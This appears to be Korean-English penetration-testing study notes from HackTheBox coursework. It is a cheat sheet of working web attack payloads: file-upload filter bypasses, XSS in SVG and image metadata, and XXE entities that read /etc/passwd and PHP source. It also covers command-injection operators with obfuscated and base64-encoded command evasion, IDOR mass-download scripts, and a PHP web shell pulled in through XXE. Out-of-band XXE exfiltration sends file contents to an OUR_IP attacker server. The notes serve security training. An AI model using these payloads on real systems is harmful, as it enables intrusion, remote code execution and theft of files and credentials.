- [ASP 단어 목록](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)

## Character Injection
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

## Content-Type Filter
- [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

## MIME-Type
- [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures)
- [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

## XSS
```exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg```

#### Scalable Vector Graphics(SVG) 이미지 (HTB.svg)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

<br/><br/>
# Command Injections

## Command Injection Methods
| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

## Injection Operators
| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

## 공백 필터 우회
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

## 기타 Blacklisted Characters 우회

### Linux (실제 적용 시 echo는 제외)
```
echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```
```
$ echo ${PATH:0:1}

/
```
```
$ echo ${LS_COLORS:10:1}

;
```

### Windows
```
C:\htb> echo %HOMEPATH:~6,-11%

\
```
```
PS C:\htb> $env:HOMEPATH[0]

\
```

#### PowerShell
```Get-ChildItem Env:```

### Character Shifting
```
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```

## Blacklisted Commands 우회

### Linux & Windows
```$ w'h'o'am'i```<br/>
```$ w"h"o"am"i```

### Linux Only
```who$@ami```<br/>
```w\ho\am\i```

### Windows Only
```C:\htb> who^ami```

## Command Obfuscation

### Case Manipulation
```PS C:\htb> WhOaMi```<br/>
```$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")```<br/>
```$(a="WhOaMi";printf %s "${a,,}")```

### Reversed Commands
```
$ echo 'whoami' | rev
imaohw

$ $(rev<<<'imaohw')
```
```
PS C:\htb> "whoami"[-1..-20] -join ''
imaohw

PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands
```
$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
```
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```
```
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```
```PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"```

- 참고 : [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

## Evasion Tools

### Linux (Bashfuscator)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
```
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
./bashfuscator -c 'cat /etc/passwd'
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1     # 짧고 간단하게
```

### Windows (DOSfuscation)
- [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
```
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

<br/><br/>
# Web Application Attacks

## HTTP Verb Tampering
| Verb      | 설명                                            |
| --------- | --------------------------------------------- |
| `HEAD`    | GET 요청과 동일하지만 응답에는 응답 본문 없이 `headers`만 포함됩니다. |
| `PUT`     | 지정된 위치에 요청 페이로드를 씁니다.                         |
| `DELETE`  | 지정된 위치의 리소스를 삭제합니다.                           |
| `OPTIONS` | 웹 서버에서 허용하는 다양한 옵션(허용되는 HTTP 동사 등)을 보여줍니다.    |
| `PATCH`   | 지정된 위치의 리소스에 부분 수정을 적용합니다.                    |
| `TRACE`   | 리소스 경로를 따라 메시지 Loop-Back 테스트를 합니다.(TRACK 도 동일)      |

```curl -i -X OPTIONS http://SERVER_IP:PORT/```

<br/><br/>
## Insecure Direct Object References (IDOR)

### Insecure Parameters Mass Enumeration
```python
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

### Encoded References Mass Enumeration
```
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

<br/><br/>
## XML External Entity(XXE) Injection

### XML
| Key           | 정의                                                       | 예                                        |
| ------------- | -------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | 일반적으로 (`<` / `>`) 문자로 묶인 XML 문서의 키입니다 .                  | `<date>`                                 |
| `Entity`      | 일반적으로 (`&` / `;`) 문자로 묶인 XML 변수입니다 .                     | `&lt;`                                   |
| `Element`     | 루트 요소나 그 자식 요소와 그 값은 시작 태그와 끝 태그 사이에 저장됩니다.              | `<date>01-01-2022</date>`                |
| `Attribute`   | XML 파서에서 사용될 수 있는 태그에 저장된 모든 요소에 대한 선택적 사양입니다.           | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | 일반적으로 XML 문서의 첫 번째 줄이며, 구문 분석할 때 사용할 XML 버전과 인코딩을 정의합니다. | `<?xml version="1.0" encoding="UTF-8"?>` |

### XML Document Type Definition(DTD)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML Entities
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

### Local File Disclosure
- JSON 데이터를 XML로 변환 : [online tool](https://www.convertjson.com/json-to-xml.htm)

#### Reading Sensitive Files
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

#### Reading Source Code
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### Remote Code Execution with XXE
```
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80
```
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
> 참고 : Space, `|`, `>`, 및 `{` 사용을 피해야 함

## Advanced File Disclosure

### Exfiltration with CDATA
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
- 변형 공격
```
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

### Error Based XXE
- DTD 파일
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind Data Exfiltration

### Out-of-band(OOB) Data Exfiltration
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```
$ vi index.php # here we write the above PHP code
$ php -S 0.0.0.0:8000
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

### Automated OOB Exfiltration
```git clone https://github.com/enjoiz/XXEinjector.git```
```
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
```ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter```<br/>
```cat Logs/10.129.201.94/etc/passwd.log```









